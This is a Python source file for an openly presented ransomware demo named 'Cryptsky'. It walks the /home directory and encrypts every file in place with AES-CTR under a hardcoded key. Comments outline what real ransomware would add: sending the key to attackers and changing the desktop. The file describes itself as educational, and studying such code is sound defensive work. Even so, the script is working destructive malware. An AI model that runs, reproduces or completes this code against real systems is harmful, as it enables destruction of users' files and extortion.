#!/usr/bin/env python
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os

import walk
import modify

# argparse here
# -d, --decrypt = store true (decrypt or encrypt)
def get_parser():
    parser = argparse.ArgumentParser(description='Cryptsky')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    return parser

def main():
    # this part would not normally exist
    # it is here to avoid the complicated key generation
    hardcoded_key = 'yellow submarine'

    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print '''
Cryptsky!
---------------
Your files have been encrypted. This is normally the part where I would
tell you to pay a ransom, and I will send you the decryption key. However, this
is an open source project to show how easy malware can be to write and to allow
others to view what may be one of the first fully open source python ransomwares.

This project does not aim to be malicious. The decryption key can be found
below, free of charge. Please be sure to type it in EXACTLY, or you risk losing
your files forever. Do not include the surrounding quotes, but do make sure
to match case, special characters, and anything else EXACTLY!
Happy decrypting and be more careful next time!

Your decryption key is: '{}'

'''.format(hardcoded_key)
        key = raw_input('Enter Your Key> ')

    else:
        # In real ransomware, this part includes complicated key generation,
        # sending the key back to attackers and more
        # maybe I'll do that later. but for now, this will do.
        key = hardcoded_key

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    # change this to fit your needs.
    startdirs = ['/home']

    for currentDir in startdirs:
        for file in walk.discoverFiles(currentDir):
            modify.modify_file_inplace(file, crypt.encrypt)
            #os.rename(file, file+'.Cryptsky') # append filename to indicate crypted

    # This wipes the key out of memory
    # to avoid recovery by third party tools
    for _ in range(100):
        #key = random(32)
        pass

    if not decrypt:
        pass
         # post encrypt stuff
         # desktop picture
         # icon, etc

if __name__=="__main__":
    main()
